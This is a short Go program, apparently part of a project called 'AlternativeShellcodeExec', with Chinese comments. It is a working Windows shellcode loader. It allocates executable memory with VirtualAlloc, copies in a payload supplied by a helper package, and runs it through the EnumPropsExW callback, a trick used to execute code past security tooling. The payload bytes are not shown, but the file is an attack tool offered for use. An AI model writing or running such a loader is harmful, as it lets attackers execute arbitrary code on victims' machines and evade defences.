package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE) // 使用 0x40 代替 PAGE_EXECUTE_READWRITE

	// 处理 op 数组
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// 获取顶层窗口句柄
	user32, _ := syscall.LoadDLL("user32.dll")
	getTopWindow, _ := user32.FindProc("GetTopWindow")
	dummy, _, err := getTopWindow.Call(0)
	if dummy == 0 {
		fmt.Println("GetTopWindow failed")
		return
	}
	if err != nil {
		fmt.Println(err.Error())
	}

	// 使用 EnumPropsExW 调用 shellcode
	enumPropsExW, _ := user32.FindProc("EnumPropsExW")
	ret, _, err := enumPropsExW.Call(dummy, addr, 0)
	if ret == 0 {
		fmt.Println("EnumPropsExW failed")
		return
	}
}

func main() {
	Run(util.ShellCode())
}
